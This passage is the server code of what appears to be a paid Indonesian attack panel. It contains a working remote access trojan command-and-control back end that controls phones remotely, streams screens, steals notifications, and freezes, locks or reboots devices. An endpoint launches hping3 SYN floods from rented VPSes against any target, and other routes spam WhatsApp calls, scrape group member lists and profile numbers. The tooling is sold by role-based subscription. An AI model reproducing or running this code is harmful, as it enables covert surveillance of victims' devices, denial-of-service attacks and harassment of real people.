  console.log('[RESP] ' + cmd + ' from ' + id);
  res.json({ status: 'ok' });
});

// ── RAT: Get Response ──────────────────────────────────────
app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat('./rat_responses.json');
  res.json(resps.find(r => r.targetId === req.params.id) || {});
});

// ── RAT: Live Frame ────────────────────────────────────────
app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

// ── RAT: Post Notification ─────────────────────────────────
app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat('./rat_notifs.json');
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat('./rat_notifs.json', n);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  const n = readRat('./rat_notifs.json');
  res.json(n.filter(x => x.targetId === req.params.id));
});

// ── Init RAT files ──────────────────────────────────────────
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  const p = './' + f + '.json';
  if (!fs.existsSync(p)) fs.writeFileSync(p, '[]');
});

// ════════════════════════════════════════════════════════════════════════════
// LOCK LIVE CHAT — komunikasi 2 arah owner ↔ target saat device di-lock
// ════════════════════════════════════════════════════════════════════════════
const lockChats = {};

app.post('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  const { text, from } = req.body;
  if (!text) return res.status(400).json({ error: 'text required' });
  if (!lockChats[id]) lockChats[id] = [];
  const msg = { from: from || 'owner', text, time: new Date().toISOString().substring(11,16) };
  lockChats[id].push(msg);
  if (lockChats[id].length > 200) lockChats[id] = lockChats[id].slice(-200);
  console.log(`[CHAT] ${from||'owner'} → ${id}: ${text}`);
  res.json({ status: 'sent' });
});

app.get('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

app.get('/api/lock-chat-all/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

app.delete('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  lockChats[id] = [];
  res.json({ status: 'cleared' });
});

// ════════════════════════════════════════════════════════════════════════════
// 🧊 FREEZE SCREEN — 2 Endpoint Aja
// ════════════════════════════════════════════════════════════════════════════
const freezeStates = {};

// POST /api/freeze/:id — Aktifkan freeze
app.post('/api/freeze/:id', (req, res) => {
  const { id } = req.params;
  const { message } = req.body;
  
  freezeStates[id] = {
    isFrozen: true,
    message: message || 'LAYAR DIKUNCI',
    frozenAt: new Date().toISOString()
  };
  
  console.log(`[🧊 FREEZE] Device ${id}: ${freezeStates[id].message}`);
  
  // Queue command ke device
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({
    targetId: id,
    command: 'freeze_screen',
    extra: freezeStates[id].message,
    timestamp: new Date()
  });
  saveRat('./rat_commands.json', cmds);
  
  res.json({ success: true, status: 'Frozen', device: id });
});

// POST /api/unfreeze/:id — Matikan freeze
app.post('/api/unfreeze/:id', (req, res) => {
  const { id } = req.params;
  
  freezeStates[id] = {
    isFrozen: false,
    unfrozenAt: new Date().toISOString()
  };
  
  console.log(`[🔥 UNFREEZE] Device ${id}`);
  
  // Queue command ke device
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({
    targetId: id,
    command: 'unfreeze_screen',
    extra: '',
    timestamp: new Date()
  });
  saveRat('./rat_commands.json', cmds);
  
  res.json({ success: true, status: 'Unfrozen', device: id });
});

app.post('/api/system-freeze/:id', (req, res) => {
  const { id } = req.params;
  console.log(`[🧊 SYSTEM FREEZE] Device ${id}`);
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command: 'system_freeze', extra: '', timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  res.json({ success: true, status: 'SystemFrozen', device: id });
});

app.post('/api/system-unfreeze/:id', (req, res) => {
  const { id } = req.params;
  console.log(`[🔥 SYSTEM UNFREEZE] Device ${id}`);
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command: 'system_unfreeze', extra: '', timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  res.json({ success: true, status: 'SystemUnfrozen', device: id });
});

// ════════════════════════════════════════════════════════════════════════════
// 🔄 REBOOT DEVICE — Restart HP target
// ════════════════════════════════════════════════════════════════════════════
app.post('/api/reboot/:id', (req, res) => {
  const { id } = req.params;
  
  console.log(`[🔄 REBOOT] Device ${id}`);
  
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({
    targetId: id,
    command: 'reboot_device',
    extra: '',
    timestamp: new Date()
  });
  saveRat('./rat_commands.json', cmds);
  
  res.json({ success: true, status: 'Rebooting', device: id });
});

const liveFrames = {};

app.post('/api/live-frame/:id', (req, res) => {
  const { id } = req.params;
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ success: false });
  liveFrames[id] = { frame, ts: ts || Date.now(), receivedAt: Date.now() };
  res.json({ success: true });
});

app.get('/api/live-frame/:id', (req, res) => {
  const data = liveFrames[req.params.id];
  if (!data) return res.json({ frame: null, status: 'no_frame' });
  if (Date.now() - data.receivedAt > 5000) {
    return res.json({ frame: null, status: 'stale' });
  }
  res.json({ frame: data.frame, ts: data.ts, status: 'ok' });
});

app.post('/api/start-screen-record/:id', (req, res) => {
  const { id } = req.params;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command: 'start_screen_record', extra: '',
    timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  res.json({ success: true, status: 'LiveScreenStarted', device: id });
});

app.post('/api/stop-screen-record/:id', (req, res) => {
  const { id } = req.params;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command: 'stop_screen_record', extra: '',
    timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  delete liveFrames[id];
  res.json({ success: true, status: 'LiveScreenStopped', device: id });
});

// Cleanup stale frames
setInterval(() => {
  const now = Date.now();
  for (const id in liveFrames) {
    if (now - liveFrames[id].receivedAt > 30000) delete liveFrames[id];
  }
}, 30000);
// ════════════════════════════════════════════════════════════════════════════
// DEVICE PERMISSION SYSTEM
// ════════════════════════════════════════════════════════════════════════════
const devicePermFile = './device_perms.json';

function loadDevicePerms() {
  try {
    if (fs.existsSync(devicePermFile)) {
      return JSON.parse(fs.readFileSync(devicePermFile, 'utf8'));
    }
  } catch(e) {}
  return {};
}

function saveDevicePerms(data) {
  fs.writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
}

app.get("/devicePerms", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const perms = loadDevicePerms();
  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
  
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (requester?.role === 'owner' || keyInfo.username?.toLowerCase() === username?.toLowerCase()) {
    const isOwner = requester?.role === 'owner';
    if (isOwner && keyInfo.username === username) {
      return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
    }
  }
  
  return res.json({ valid: true, ...userPerm });
});

app.post("/setDevicePerm", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });
  
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, error: "Only owner can manage permissions" });
  }
  
  const { username, approved, allDevices, devices } = req.body;
  if (!username) return res.status(400).json({ valid: false, error: "Username required" });
  
  const perms = loadDevicePerms();
  perms[username.toLowerCase()] = {
    approved: approved === true || approved === 'true',
    allDevices: allDevices === true || allDevices === 'true',
    devices: Array.isArray(devices) ? devices : []
  };
  saveDevicePerms(perms);
  
  return res.json({ valid: true, message: "Permission updated" });
});

app.get("/listDevicePerms", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') return res.status(403).json({ valid: false });
  const perms = loadDevicePerms();
  return res.json({ valid: true, perms });
});

// ════════════════════════════════════════════════════════════════════════════
// API ROUTES RAT (prefix /api/)
// ════════════════════════════════════════════════════════════════════════════

// ── API RAT — Register ──────────────────────────────────────
app.post('/api/register-target', (req, res) => { req.url = '/api/register-target'; app.handle(req, res); });
// ── API RAT — Heartbeat ─────────────────────────────────────
app.post('/api/heartbeat/:id', (req, res) => { req.url = '/api/heartbeat/' + req.params.id; app.handle(req, res); });
// ── API RAT — List Targets ──────────────────────────────────
app.get('/api/list-targets', (req, res) => { req.url = '/api/list-targets'; app.handle(req, res); });
// ── API RAT — Pair Target ───────────────────────────────────
app.post('/api/pair-target', (req, res) => { req.url = '/api/pair-target'; app.handle(req, res); });
// ── API RAT — Send Command ──────────────────────────────────
app.post('/api/send-command', (req, res) => { req.url = '/api/send-command'; app.handle(req, res); });
// ── API RAT — Get Command ───────────────────────────────────
app.get('/api/get-command/:id', (req, res) => { req.url = '/api/get-command/' + req.params.id; app.handle(req, res); });
// ── API RAT — Post Response ─────────────────────────────────
app.post('/api/post-response/:id', (req, res) => { req.url = '/api/post-response/' + req.params.id; app.handle(req, res); });
// ── API RAT — Get Response ──────────────────────────────────
app.get('/api/get-response/:id', (req, res) => { req.url = '/api/get-response/' + req.params.id; app.handle(req, res); });
// ── API RAT — Live Frame ────────────────────────────────────
app.post('/api/live-frame/:id', (req, res) => { req.url = '/api/live-frame/' + req.params.id; app.handle(req, res); });
app.get('/api/live-frame/:id', (req, res) => { req.url = '/api/live-frame/' + req.params.id; app.handle(req, res); });
// ── API RAT — Notifications ─────────────────────────────────
app.post('/api/post-notification/:id', (req, res) => { req.url = '/api/post-notification/' + req.params.id; app.handle(req, res); });
app.get('/api/get-notifications/:id', (req, res) => { req.url = '/api/get-notifications/' + req.params.id; app.handle(req, res); });
// ── API RAT — Pair ID ───────────────────────────────────────
app.get('/rat/pairid', (req, res) => { req.url = '/rat/pairid'; app.handle(req, res); });
// ── API RAT — My Devices ────────────────────────────────────
app.get('/rat/my-devices', (req, res) => { req.url = '/rat/my-devices'; app.handle(req, res); });
// ── API RAT — Grant/Revoke Member ──────────────────────────
app.post('/rat/grant-member', (req, res) => { req.url = '/rat/grant-member'; app.handle(req, res); });
app.post('/rat/revoke-member', (req, res) => { req.url = '/rat/revoke-member'; app.handle(req, res); });
// ── API RAT — Lock Chat ─────────────────────────────────────
app.post('/api/lock-chat/:id', (req, res) => { req.url = '/api/lock-chat/' + req.params.id; app.handle(req, res); });
app.get('/api/lock-chat/:id', (req, res) => { req.url = '/api/lock-chat/' + req.params.id; app.handle(req, res); });
app.get('/api/lock-chat-all/:id', (req, res) => { req.url = '/api/lock-chat-all/' + req.params.id; app.handle(req, res); });
app.delete('/api/lock-chat/:id', (req, res) => { req.url = '/api/lock-chat/' + req.params.id; app.handle(req, res); });

// ════════════════════════════════════════════════════════════════════════════
// API RAT — Health Check
// ════════════════════════════════════════════════════════════════════════════
app.get('/api/health', (req, res) => {
    const targets = readData(TARGETS_FILE);
    const onlineCount = targets.filter(t => t.status === "Online").length;
    res.json({ 
        status: 'ok', 
        totalTargets: targets.length,
        onlineTargets: onlineCount
    });
});

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

const spamCooldown = {};
const cooldowns = {};

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "admin", "owner", "tk"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "reseller" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    await sock.updateBlockStatus(jid, "unblock");
    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
          await sock.updateBlockStatus(jid, "unblock");
          await sock.offerCall(jid, true);
          await sock.updateBlockStatus(jid, "block");
          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

// ========== CHAT ENDPOINTS ==========
// GET /api/chat/messages
app.get("/api/chat/messages", (req, res) => {
  const { session_key } = req.query;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const username = keyInfo.username;
  
  // Ambil semua pesan yang melibatkan user ini
  const userMessages = chatList.filter(m => 
    m.from === username || m.to === username
  );
  
  res.json(userMessages);
});

// POST /api/chat/send
app.post("/api/chat/send", (req, res) => {
  const { session_key, username, role, message } = req.body;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session" });
  }
  
  if (keyInfo.username !== username) {
    return res.status(401).json({ valid: false, message: "Username mismatch" });
  }
  
  if (!message || message.trim() === "") {
    return res.status(400).json({ valid: false, message: "Message cannot be empty" });
  }
  
  const chat = {
    from: username,
    to: "public", // atau bisa pakai "public_chat"
    message: sanitize(message),
    role: role,
    time: new Date().toISOString(),
    created_at: new Date().toISOString()
  };
  
  chatList.push(chat);
  saveChat();
  
  // Broadcast ke semua client WebSocket yang terhubung
  for (const ws of Object.values(wsClients)) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'new_message',
        message: chat
      }));
    }
  }
  
  res.json({ valid: true, status: "sent", message: chat });
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/5u9m0y.png",
    title: "𝐖𝐢𝐝𝐬𝐄𝐯𝐞𝐫𝐥𝐲 𝐔𝐩𝐝𝐚𝐭𝐞",
    desc: "Buy Acces Chat @Yannkecebet"
  },
  {
    image: "https://files.catbox.moe/tg4nhh.png",
    title: "𝐏𝐫𝐞𝐯𝐢𝐞𝐰 𝐁𝐮𝐠𝐬",
    desc: "Chanel : @WidsEverly"
  }
];

app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  role: user.role || "member",
  listBug: bugs,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// ============================================================
// 📤 SEND BUG — Dengan Dukungan Sender Global/Private
// ============================================================

const FALLBACK_DIR = "./database";
const FALLBACK_FILE = path.join(FALLBACK_DIR, "fallback.json");

// ================= AUTO CREATE =================
if (!fs.existsSync(FALLBACK_DIR)) {
  fs.mkdirSync(FALLBACK_DIR, { recursive: true });
  console.log("[📁] Folder database dibuat");
}

if (!fs.existsSync(FALLBACK_FILE)) {
  fs.writeFileSync(FALLBACK_FILE, JSON.stringify({}, null, 2));
  console.log("[📄] fallback.json berhasil dibuat");
} else {
  console.log("[📄] fallback.json loaded");
}
// ==============================================

function loadFallbackData() {
  return JSON.parse(fs.readFileSync(FALLBACK_FILE));
}

function saveFallbackData(data) {
  fs.writeFileSync(FALLBACK_FILE, JSON.stringify(data, null, 2));
}

function useFallback(username, role) {
  const data = loadFallbackData();

  if (!data[username]) {
    data[username] = {
      role,
      remaining: FALLBACK_LIMITS[role]
    };
  }

  if (data[username].remaining <= 0) {
    return false;
  }

  data[username].remaining -= 1;

  saveFallbackData(data);

  return true;
}

const FALLBACK_LIMITS = {
  reseller: 3,
  admin: 5,
  owner: 10,
  tk: 30
};

function getFallbackRemaining(username, role) {
  const data = loadFallbackData();

  if (!FALLBACK_LIMITS[role]) {
    return 0;
  }

  if (!data[username]) {
    data[username] = {
      role,
      remaining: FALLBACK_LIMITS[role]
    };

    saveFallbackData(data);
  }

  return data[username].remaining;
}

// ============================================================
// 📱 GLOBAL NUMBER MANAGER - Untuk menyimpan daftar nomor global
// ============================================================
const GLOBAL_NUMBER_FILE = path.join(__dirname, 'nomberglobal.json');

// Inisialisasi file jika belum ada
if (!fs.existsSync(GLOBAL_NUMBER_FILE)) {
    fs.writeFileSync(GLOBAL_NUMBER_FILE, JSON.stringify([]));
    console.log('[📱] nomberglobal.json dibuat');
}

// Fungsi untuk memuat daftar nomor global
function loadGlobalNumbers() {
    try {
        const data = fs.readFileSync(GLOBAL_NUMBER_FILE, 'utf8');
        return JSON.parse(data);
    } catch {
        return [];
    }
}

// Fungsi untuk menyimpan daftar nomor global
function saveGlobalNumbers(numbers) {
    fs.writeFileSync(GLOBAL_NUMBER_FILE, JSON.stringify(numbers, null, 2));
    console.log(`[📱] ${numbers.length} nomor global disimpan`);
}

// Fungsi untuk menghasilkan nomor acak dengan prefix 62
function generateRandomNumber() {
    const prefix = '62';
    const length = 10 + Math.floor(Math.random() * 3); // 10-12 digit setelah prefix
    let number = prefix;
    for (let i = 0; i < length; i++) {
        number += Math.floor(Math.random() * 10);
    }
    return number;
}

// ============================================================
// 📱 TELEGRAM COMMAND: /addnomberglobal <jumlah>
// ============================================================
bot.onText(/^\/addnomberglobal\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const jumlah = parseInt(match[1]);

    // Cek izin - Hanya owner
    if (fromId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    if (jumlah < 1 || jumlah > 100) {
        return bot.sendMessage(chatId, "⚠️ Jumlah minimal 1 dan maksimal 100.");
    }

    try {
        // Load nomor yang sudah ada
        let existingNumbers = loadGlobalNumbers();
        
        // Generate nomor baru sebanyak jumlah
        const newNumbers = [];
        for (let i = 0; i < jumlah; i++) {
            let newNumber;
            let attempts = 0;
            // Pastikan tidak ada duplikat
            do {
                newNumber = generateRandomNumber();
                attempts++;
            } while (existingNumbers.includes(newNumber) && attempts < 50);
            
            if (!existingNumbers.includes(newNumber)) {
                newNumbers.push(newNumber);
            }
        }

        // Gabungkan dengan yang sudah ada
        const allNumbers = [...existingNumbers, ...newNumbers];
        saveGlobalNumbers(allNumbers);

        // Format response
        const numberList = allNumbers.map((n, i) => `${i + 1}. \`${n}\``).join('\n');
        const response = `
📱 *Daftar Nomor Global*

✅ Berhasil menambahkan *${newNumbers.length}* nomor baru!
📊 Total nomor: *${allNumbers.length}*

📋 *Daftar Nomor:*
${numberList || 'Belum ada nomor'}

*Catatan:* Nomor ini bisa digunakan untuk berbagai keperluan seperti spam, call, dll.
        `.trim();

        await bot.sendMessage(chatId, response, { parse_mode: "Markdown" });

        // Kirim notifikasi ke grup utama
        sendToGroupsUtama(`📱 *Nomor Global Ditambahkan*\nJumlah: ${newNumbers.length}\nTotal: ${allNumbers.length}`, { parse_mode: "Markdown" });

    } catch (err) {
        console.error("[❌ ADD GLOBAL NUMBER ERROR]", err);
        bot.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

// ============================================================
// 📱 TELEGRAM COMMAND: /dellnomber - Hapus semua nomor global
// ============================================================
bot.onText(/^\/dellnomber$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Cek izin - Hanya owner
    if (fromId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    try {
        const currentNumbers = loadGlobalNumbers();
        const count = currentNumbers.length;

        if (count === 0) {
            return bot.sendMessage(chatId, "📱 Tidak ada nomor global yang tersimpan.");
        }

        // Konfirmasi dengan tombol
        const opts = {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ Ya, Hapus Semua", callback_data: "confirm_dellnomber" }],
                    [{ text: "❌ Batal", callback_data: "cancel_dellnomber" }]
                ]
            }
        };

        await bot.sendMessage(
            chatId, 
            `⚠️ *Konfirmasi Hapus*\n\nAnda akan menghapus *${count}* nomor global.\n\nYakin ingin melanjutkan?`, 
            opts
        );

    } catch (err) {
        console.error("[❌ DEL GLOBAL NUMBER ERROR]", err);
        bot.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

// ============================================================
// 📱 TELEGRAM COMMAND: /lihatnomber - Lihat semua nomor global
// ============================================================
bot.onText(/^\/lihatnomber$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Cek izin - Hanya owner
    if (fromId !== OWNER_ID) {
